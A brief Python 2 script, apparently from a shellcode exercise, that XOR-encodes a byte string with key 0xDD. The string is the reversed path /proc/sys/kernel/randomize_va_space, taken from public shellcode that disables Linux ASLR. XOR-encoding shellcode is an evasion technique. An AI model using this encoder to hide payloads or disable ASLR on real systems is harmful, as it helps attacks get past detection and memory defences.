#!/usr/bin/python

# Python XOR Encoder (with 0xDD)

# original shellcode of //proc/sys/kernel/randomize_va_space
# original source code URL : http://shell-storm.org/shellcode/files/shellcode-813.php


shellcode = "\x65\x63\x61\x70"
shellcode += "\x73\x5f\x61\x76"
shellcode += "\x5f\x65\x7a\x69"
shellcode += "\x6d\x6f\x64\x6e"
shellcode += "\x61\x72\x2f\x6c"
shellcode += "\x65\x6e\x72\x65"
shellcode += "\x6b\x2f\x73\x79"
shellcode += "\x73\x2f\x63\x6f"
shellcode += "\x72\x70\x2f\x2f"


encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	# XOR Encoding 	
	y = x^0xDD
	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
